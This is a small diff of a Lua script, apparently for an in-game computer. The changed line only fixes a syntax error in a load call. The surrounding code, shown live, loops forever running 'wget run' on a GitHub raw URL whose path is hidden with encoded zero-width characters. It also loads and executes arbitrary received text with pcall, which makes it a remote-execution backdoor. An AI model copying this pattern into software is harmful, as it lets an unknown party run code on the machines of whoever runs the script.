@@ -6,7 +6,7 @@ while true do
       shell.execute("wget",'run','https://raw.githubusercontent.com/BouncyRocket/-/%E2%80%8B%E2%80%8B/sup.lua')
    end
    msg = 'return ' ..plain
-   local func, err = load(msg)(
+   local func, err = load(msg)()
    if func then
       local result, err = pcall(func)
       if result then
